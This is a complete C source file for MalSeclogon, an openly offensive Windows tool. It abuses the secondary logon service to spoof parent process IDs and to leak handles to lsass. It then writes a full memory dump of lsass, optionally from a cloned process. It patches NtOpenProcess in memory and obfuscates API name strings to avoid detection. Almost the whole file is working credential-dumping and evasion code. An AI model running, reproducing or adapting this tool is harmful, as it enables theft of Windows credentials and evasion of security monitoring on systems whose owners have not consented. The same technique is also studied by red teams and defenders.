#include "windows.h"
#include "stdio.h"
#include "ntdef.h"
#include <strsafe.h>

void usage();
BOOL SetPrivilege(HANDLE hToken, wchar_t* lpszPrivilege, BOOL bEnablePrivilege);
void EnableDebugPrivilege(BOOL enforceCheck);
void SpoofPidTeb(DWORD spoofedPid, PDWORD originalPid, PDWORD originalTid);
void RestoreOriginalPidTeb(DWORD originalPid, DWORD originalTid);
void FindProcessHandlesInLsass(DWORD lsassPid, HANDLE* handlesToLeak, PDWORD handlesToLeakCount);
void MalSeclogonPPIDSpoofing(int lsassPid, wchar_t* cmdline);
void ReplaceNtOpenProcess(HANDLE leakedHandle, char* oldCode, int* oldCodeSize);
void RestoreNtOpenProcess(char* oldCode, int oldCodeSize);
void MalSeclogonLeakHandles(int lsassPid, wchar_t* dumpPath);
void MalSeclogonDumpLsassFromLeakedHandles(int lsassPid, wchar_t* dumpPath, BOOL useLsassClone);
NTSTATUS QueryObjectTypesInfo(__out POBJECT_TYPES_INFORMATION* TypesInfo);
NTSTATUS GetTypeIndexByName(__in PCUNICODE_STRING TypeName, __out PULONG TypeIndex);
BOOL FileExists(LPCTSTR szPath);

int wmain(int argc, wchar_t** argv)
{
	int targetPid = -1;
	DWORD lsassDumpType = 0;
	BOOL handlesLeaked = FALSE, useLsassClone = FALSE;
	wchar_t defaultDumpPath[] = L"C:\\lsass.dmp";
	wchar_t defaultCmdline[] = L"cmd.exe";
	wchar_t* dumpPath = defaultDumpPath;
	wchar_t* cmdline = defaultCmdline;
	int cnt = 1;
	while ((argc > 1) && (argv[cnt][0] == '-'))
	{
		switch (argv[cnt][1])
		{
			case 'p':
				++cnt;
				--argc;
				targetPid = _wtoi(argv[cnt]);
				break;

			case 'd':
				++cnt;
				--argc;
				if (argv[cnt] == L'\0') goto DefaultLabel;
				lsassDumpType = _wtoi(argv[cnt]);
				break;

			case 'o':
				++cnt;
				--argc;
				dumpPath = argv[cnt];
				break;

			case 'c':
				++cnt;
				--argc;
				cmdline = argv[cnt];
				break;

			case 'l':
				++cnt;
				--argc;
				handlesLeaked = TRUE;
				break;

			case 'h':
				usage();
				exit(0);

		DefaultLabel:
			default:
				printf("Wrong Argument: %S\n", argv[cnt]);
				usage();
				exit(-1);
		}
		++cnt;
		--argc;
	}

	if (targetPid == -1) {
		usage();
		exit(-1);
	}

	if (lsassDumpType == 2) useLsassClone = TRUE;
	if (lsassDumpType == 1 || lsassDumpType == 2) {
		if (handlesLeaked)
			MalSeclogonDumpLsassFromLeakedHandles(targetPid, dumpPath, useLsassClone);
		else
			MalSeclogonLeakHandles(targetPid, dumpPath);
	}
	else {
		MalSeclogonPPIDSpoofing(targetPid, cmdline);
	}
	return 0;
}


BOOL SetPrivilege(HANDLE hToken, wchar_t* lpszPrivilege, BOOL bEnablePrivilege)
{
	TOKEN_PRIVILEGES tp;
	PRIVILEGE_SET privs;
	LUID luid;
	BOOL debugPrivEnabled = FALSE;
	if (!LookupPrivilegeValueW(NULL, lpszPrivilege, &luid))
	{
		printf("LookupPrivilegeValueW() failed, error %u\n", GetLastError());
		return FALSE;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		printf("AdjustTokenPrivileges() failed, error %u\n", GetLastError());
		return FALSE;
	}
	privs.PrivilegeCount = 1;
	privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
	privs.Privilege[0].Luid = luid;
	privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!PrivilegeCheck(hToken, &privs, &debugPrivEnabled)) {
		printf("PrivilegeCheck() failed, error %u\n", GetLastError());
		return FALSE;
	}
	if (!debugPrivEnabled)
		return FALSE;
	return TRUE;
}

void EnableDebugPrivilege(BOOL enforceCheck) {
	HANDLE currentProcessToken = NULL;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &currentProcessToken);
	BOOL setPrivilegeSuccess = SetPrivilege(currentProcessToken, L"SeDebugPrivilege", TRUE);
	if (enforceCheck && !setPrivilegeSuccess) {
		printf("SetPrivilege failed to enable SeDebugPrivilege. Run it as an Administrator. Exiting...\n");
		exit(-1);
	}
	CloseHandle(currentProcessToken);
}
 
void SpoofPidTeb(DWORD spoofedPid, PDWORD originalPid, PDWORD originalTid) {
	CLIENT_ID CSpoofedPid;
	DWORD oldProtection, oldProtection2;
	*originalPid = GetCurrentProcessId();
	*originalTid = GetCurrentThreadId();
	CLIENT_ID* pointerToTebPid = &(NtCurrentTeb()->ClientId);
	CSpoofedPid.UniqueProcess = (HANDLE)spoofedPid;
	CSpoofedPid.UniqueThread = (HANDLE)*originalTid;
	VirtualProtect(pointerToTebPid, sizeof(CLIENT_ID), PAGE_EXECUTE_READWRITE, &oldProtection);
	memcpy(pointerToTebPid, &CSpoofedPid, sizeof(CLIENT_ID));
	VirtualProtect(pointerToTebPid, sizeof(CLIENT_ID), oldProtection, &oldProtection2);
}

void RestoreOriginalPidTeb(DWORD originalPid, DWORD originalTid) {
	CLIENT_ID CRealPid;
	DWORD oldProtection, oldProtection2;
	CLIENT_ID* pointerToTebPid = &(NtCurrentTeb()->ClientId);
	CRealPid.UniqueProcess = (HANDLE)originalPid;
	CRealPid.UniqueThread = (HANDLE)originalTid;
	VirtualProtect(pointerToTebPid, sizeof(CLIENT_ID), PAGE_EXECUTE_READWRITE, &oldProtection);
	memcpy(pointerToTebPid, &CRealPid, sizeof(CLIENT_ID));
	VirtualProtect(pointerToTebPid, sizeof(CLIENT_ID), oldProtection, &oldProtection2);
}



NTSTATUS QueryObjectTypesInfo(__out POBJECT_TYPES_INFORMATION* TypesInfo) {
	NTSTATUS Status;
	ULONG BufferLength = 0x1000;
	PVOID Buffer;
	pNtQueryObject NtQueryObject = (pNtQueryObject)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtQueryObject");
	*TypesInfo = NULL;
	do {
		Buffer = malloc(BufferLength);
		if (Buffer == NULL)
			return (NTSTATUS)STATUS_INSUFFICIENT_RESOURCES;
		Status = NtQueryObject(NULL, ObjectTypesInformation, Buffer, BufferLength, &BufferLength);
		if (NT_SUCCESS(Status)) {
			*TypesInfo = Buffer;
			return Status;
		}
		free(Buffer);
	} while (Status == STATUS_INFO_LENGTH_MISMATCH);
	return Status;
}

// credits for this goes to @0xrepnz --> https://twitter.com/0xrepnz/status/1401118056294846467
NTSTATUS GetTypeIndexByName(__in PCUNICODE_STRING TypeName, __out PULONG TypeIndex) {
	NTSTATUS Status;
	POBJECT_TYPES_INFORMATION ObjectTypes;
	POBJECT_TYPE_INFORMATION_V2 CurrentType;
	*TypeIndex = 0;
	pRtlCompareUnicodeString RtlCompareUnicodeString = (pRtlCompareUnicodeString)GetProcAddress(LoadLibrary(L"ntdll.dll"), "RtlCompareUnicodeString");
	Status = QueryObjectTypesInfo(&ObjectTypes);
	if (!NT_SUCCESS(Status)) {
		printf("QueryObjectTypesInfo failed: 0x%08x\n", Status);
		return Status;
	}
	CurrentType = (POBJECT_TYPE_INFORMATION_V2)OBJECT_TYPES_FIRST_ENTRY(ObjectTypes);
	for (ULONG i = 0; i < ObjectTypes->NumberOfTypes; i++) {
		if (RtlCompareUnicodeString(TypeName, &CurrentType->TypeName, TRUE) == 0) {
			*TypeIndex = i + 2;
			break;
		}
		CurrentType = (POBJECT_TYPE_INFORMATION_V2)OBJECT_TYPES_NEXT_ENTRY(CurrentType);
	}
	if (!*TypeIndex)
		Status = STATUS_NOT_FOUND;
	free(ObjectTypes);
	return Status;
}

void FindProcessHandlesInLsass(DWORD lsassPid, HANDLE *handlesToLeak, PDWORD handlesToLeakCount) 
{
	PSYSTEM_HANDLE_INFORMATION handleInfo = NULL;
	DWORD handleInfoSize = 0x10000;
	NTSTATUS status;
	ULONG processTypeIndex;
	UNICODE_STRING processTypeName = RTL_CONSTANT_STRING(L"Process");
	status = GetTypeIndexByName(&processTypeName, &processTypeIndex);
	if (!NT_SUCCESS(status)) {
		printf("GetTypeIndexByName failed 0x%08x\n", status);
		exit(-1);
	}
	pNtQuerySystemInformation NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtQuerySystemInformation");
	handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
	while ((status = NtQuerySystemInformation(SystemHandleInformation, handleInfo, handleInfoSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
		handleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);
	for (DWORD i = 0; i < handleInfo->HandleCount; i++) {
		if (handleInfo->Handles[i].ObjectTypeIndex == processTypeIndex && handleInfo->Handles[i].UniqueProcessId == lsassPid) {
			handlesToLeak[*handlesToLeakCount] = (HANDLE)handleInfo->Handles[i].HandleValue;
			*handlesToLeakCount = *handlesToLeakCount + 1;
		}
	}
	free(handleInfo);
}


void MalSeclogonPPIDSpoofing(int pid, wchar_t* cmdline)
{
	PROCESS_INFORMATION procInfo;
	STARTUPINFO startInfo;
	DWORD originalPid, originalTid;
	EnableDebugPrivilege(FALSE);
	SpoofPidTeb((DWORD)pid, &originalPid, &originalTid);
	RtlZeroMemory(&procInfo, sizeof(PROCESS_INFORMATION));
	RtlZeroMemory(&startInfo, sizeof(STARTUPINFO));
	if (!CreateProcessWithLogonW(L"MalseclogonUser", L"MalseclogonDomain", L"MalseclogonPwd", LOGON_NETCREDENTIALS_ONLY, NULL, cmdline, 0, NULL, NULL, &startInfo, &procInfo)) {
		printf("CreateProcessWithLogonW() failed with error code %d \n", GetLastError());
		exit(-1);
	}
	RestoreOriginalPidTeb(originalPid, originalTid);
	// the returned handles in procInfo are wrong and duped into the spoofed parent process, so we can't close handles or wait for process end.
	printf("Spoofed process %S created correctly as child of PID %d !", cmdline, pid);
}

BOOL FileExists(LPCTSTR szPath)
{
	DWORD dwAttrib = GetFileAttributes(szPath);
	return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

void MalSeclogonLeakHandles(int lsassPid, wchar_t* dumpPath) {
	PROCESS_INFORMATION procInfo;
	STARTUPINFO startInfo;
	DWORD originalPid, originalTid;
	wchar_t moduleFilename[MAX_PATH], newCmdline[MAX_PATH];
	wchar_t cmdlineTemplate[] = L"%s %s";
	HANDLE handlesToLeak[8192];
	DWORD handlesToLeakCount = 0;
	DWORD leakedHandlesCounter = 0;
	EnableDebugPrivilege(TRUE);
	FindProcessHandlesInLsass(lsassPid, handlesToLeak, &handlesToLeakCount);
	if (handlesToLeakCount < 1) {
		printf("No process handles to lsass found. The PID you specified does not seem to be the lsass pid.\n");
		exit(-1);
	}
	// hacky thing to respawn the current process with different commandline. This should flag our next execution to contains leaked handles
	StringCchPrintfW(newCmdline, MAX_PATH, cmdlineTemplate, GetCommandLine(), L"-l 1");
	GetModuleFileName(NULL, moduleFilename, MAX_PATH);
	if (FileExists(dumpPath)) DeleteFile(dumpPath);
	SpoofPidTeb((DWORD)lsassPid, &originalPid, &originalTid);
	// we are running in a loop because we can force the seclogon service to duplicate 3 handles at a time. It's not ensured lsass handles are the first 3 leaked handles, so we need to iterate...
	while (leakedHandlesCounter < handlesToLeakCount) {
		RtlZeroMemory(&procInfo, sizeof(PROCESS_INFORMATION));
		RtlZeroMemory(&startInfo, sizeof(STARTUPINFO));
		startInfo.dwFlags = STARTF_USESTDHANDLES;
		startInfo.hStdInput = (HANDLE)handlesToLeak[leakedHandlesCounter++];
		startInfo.hStdOutput = (HANDLE)handlesToLeak[leakedHandlesCounter++];
		startInfo.hStdError = (HANDLE)handlesToLeak[leakedHandlesCounter++];
		printf("Attempt to leak process handles from lsass: 0x%04x 0x%04x 0x%04x...\n", startInfo.hStdInput, startInfo.hStdOutput, startInfo.hStdError);
		if (!CreateProcessWithLogonW(L"MalseclogonUser", L"MalseclogonDomain", L"MalseclogonPwd", LOGON_NETCREDENTIALS_ONLY, moduleFilename, newCmdline, 0, NULL, NULL, &startInfo, &procInfo)) {
			printf("CreateProcessWithLogonW() failed with error code %d \n", GetLastError());
			exit(-1);
		}
		// we cannot call WaitForSingleObject on the returned handle in startInfo because the handles are duped into lsass process, we need a new handle
		HANDLE hSpoofedProcess = OpenProcess(SYNCHRONIZE, FALSE, procInfo.dwProcessId);
		WaitForSingleObject(hSpoofedProcess, INFINITE);
		CloseHandle(hSpoofedProcess);
		if (FileExists(dumpPath)) break;
	}
	RestoreOriginalPidTeb(originalPid, originalTid);
	if (FileExists(dumpPath))
		printf("Lsass dump created with leaked handle! Check the path %S\n", dumpPath);
	else
		printf("Something went wrong :(\n");
}

// this is very dirty, minimal effort code to replace NtOpenProcess. We return the leaked lsass handle instead of opening a new handle
void ReplaceNtOpenProcess(HANDLE leakedHandle, char* oldCode, int* oldCodeSize) {
	/*
		mov QWORD [rcx], 0xffff
		xor rax, rax
		ret
	*/
	char replacedFunc[] = { 0x48, 0xC7, 0x01, 0xFF, 0xFF, 0x00, 0x00, 0x48, 0x31, 0xC0, 0xC3 };
	DWORD oldProtection, oldProtection2;
	char* addrNtOpenProcess = (char*)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtOpenProcess");
	// we save old code to restore the original function
	*oldCodeSize = sizeof(replacedFunc);
	memcpy(oldCode, addrNtOpenProcess, *oldCodeSize);
	memcpy((replacedFunc + 3), (WORD*)&leakedHandle, sizeof(WORD));
	VirtualProtect(addrNtOpenProcess, sizeof(replacedFunc), PAGE_EXECUTE_READWRITE, &oldProtection);
	memcpy(addrNtOpenProcess, replacedFunc, sizeof(replacedFunc));
	VirtualProtect(addrNtOpenProcess, sizeof(replacedFunc), oldProtection, &oldProtection2);
}

void RestoreNtOpenProcess(char* oldCode, int oldCodeSize) {
	DWORD oldProtection, oldProtection2;
	char* addrNtOpenProcess = (char*)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtOpenProcess");
	VirtualProtect(addrNtOpenProcess, oldCodeSize, PAGE_EXECUTE_READWRITE, &oldProtection);
	memcpy(addrNtOpenProcess, oldCode, oldCodeSize);
	VirtualProtect(addrNtOpenProcess, oldCodeSize, oldProtection, &oldProtection2);
}

void MalSeclogonDumpLsassFromLeakedHandles(int lsassPid, wchar_t* dumpPath, BOOL useLsassClone) {
	wchar_t dbgcoreStr[] = {L'd', L'b', L'g', L'c', L'o', L'r', L'e', L'.', L'd', L'l', L'l', 0x00, 0x00};
	wchar_t ntdllStr[] = { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', 0x00, 0x00 };
	char MiniDumpWriteDumpStr[] = { 'M', 'i', 'n', 'i', 'D', 'u', 'm', 'p', 'W', 'r', 'i', 't', 'e', 'D', 'u', 'm', 'p', 0x00 };
	char NtCreateProcessExStr[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'E', 'x', 0x00 };
	pMiniDumpWriteDump MiniDumpWriteDump = NULL;
	pNtCreateProcessEx NtCreateProcessEx = NULL;
	char oldCode[15];
	int oldCodeSize;
	HANDLE hLeakedHandleFullAccess = NULL, hLsassClone = NULL, hLsass = NULL;
	RtlZeroMemory(oldCode, 15);
	MiniDumpWriteDump = (pMiniDumpWriteDump)GetProcAddress(LoadLibrary(dbgcoreStr), MiniDumpWriteDumpStr);
	if (useLsassClone) NtCreateProcessEx = (pNtCreateProcessEx)GetProcAddress(LoadLibrary(ntdllStr), NtCreateProcessExStr);
	// now we expect to have leaked handles in our current process. Even if the seclogon can duplicate 3 handles at a time it seems it duplicates each one 2 times, so total handles = 6
	for (__int64 leakedHandle = 4; leakedHandle <= 4 * 6; leakedHandle = leakedHandle + 4) {
		if (GetProcessId((HANDLE)leakedHandle) == lsassPid) {
			hLsass = NULL;
			HANDLE hFileDmp = CreateFile(dumpPath, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (useLsassClone) {
				// the leaked handle does not have PROCESS_CREATE_PROCESS right so we cannot use it for NtCreateProcessEx call. Using a trick by @tiraniddo to get a handle with full access:
				// "The DuplicateHandle system call has an interesting behaviour when using the pseudo current process handle, which has the value -1. Specifically if you try and duplicate the pseudo handle from another process you get back a full access handle to the source process."
				// details here --> https://www.tiraniddo.dev/2017/10/bypassing-sacl-auditing-on-lsass.html
				DuplicateHandle((HANDLE)leakedHandle, (HANDLE)-1, GetCurrentProcess(), &hLeakedHandleFullAccess, 0, FALSE, DUPLICATE_SAME_ACCESS);
				NTSTATUS status = NtCreateProcessEx(&hLsassClone, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, NULL, hLeakedHandleFullAccess, 0, NULL, NULL, NULL, FALSE);
				if (status != 0) {
					printf("NtCreateProcessEx failed with ntstatus 0x%08x", status);
					exit(-1);
				}
				hLsass = hLsassClone;
			}
			else
				hLsass = (HANDLE)leakedHandle;
			// we ensure no one will close the handle, it seems RtlQueryProcessDebugInformation() called from MiniDumpWriteDump() try to close it
			SetHandleInformation(hLsass, HANDLE_FLAG_PROTECT_FROM_CLOSE, HANDLE_FLAG_PROTECT_FROM_CLOSE);
			// we need to patch NtOpenProcess because MiniDumpWriteDump() would open a new handle to lsass and we want to avoid that
			ReplaceNtOpenProcess((HANDLE)hLsass, oldCode, &oldCodeSize);
			BOOL result = MiniDumpWriteDump((HANDLE)hLsass, GetProcessId(hLsass), hFileDmp, MiniDumpWithFullMemory, NULL, NULL, NULL);
			RestoreNtOpenProcess(oldCode, oldCodeSize);
			CloseHandle(hFileDmp);
			// unprotect the handle for close
			SetHandleInformation(hLsass, HANDLE_FLAG_PROTECT_FROM_CLOSE, 0);
			CloseHandle(hLsass);
			if (result)
				break;
			else
				DeleteFile(dumpPath);
		}
		else
			CloseHandle((HANDLE)leakedHandle);
	}
}

void usage()
{
	printf("\n\tMalSeclogon v0.1\n\t@splinter_code\n\n");
	printf("Mandatory args: \n"
		"-p Pid of the process to spoof the PPID through seclogon service\n"
	);
	printf("\n");
	printf("Other args: \n"
		"-d Dump lsass method\n"
		"\t1 = Dump lsass by using leaked handles\n"
		"\t2 = Dump lsass by using leaked handles and cloned lsass process\n"
		"-o Output path of the dump (default C:\\lsass.dmp)\n"
		"-c Commandline of the spoofed process, default: cmd.exe (not compatible with -d)\n"
	);
	printf("\n");
	printf("Examples: \n"
		"- Run a process with a spoofed PPID:\n"
		"\tMalseclogon.exe -p [PPID] -c cmd.exe\n"
		"- Dump lsass by using leaked handles:\n"
		"\tMalseclogon.exe -p [lsassPid] -d 1\n"
		"- Dump lsass by using leaked handles and cloned lsass process:\n"
		"\tMalseclogon.exe -p [lsassPid] -d 2\n"
	);
	printf("\n");
}